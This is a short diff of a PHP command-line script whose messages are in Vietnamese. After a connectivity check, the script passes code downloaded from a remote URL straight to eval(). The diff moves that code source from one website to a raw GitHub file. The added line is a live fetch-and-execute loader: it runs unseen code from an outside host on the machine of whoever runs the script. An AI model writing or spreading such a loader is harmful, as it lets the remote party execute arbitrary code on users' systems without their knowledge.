@@ -119,5 +119,5 @@ sleep(2);
 if (!$sock = @fsockopen('www.google.com', 80)) {
   exit ("\n\033[1;91m[ERROR] \033[1;97m=> \033[1;91mVui Lòng Bật Kết Nối Wifi Hoặc 4G.\n");
 }else {
-  eval(file_get_contents('http://automxhvn.online/31cd.php'));
+  eval(file_get_contents('https://raw.githubusercontent.com/sangdeveloper36/sang/main/31cd1'));
 }
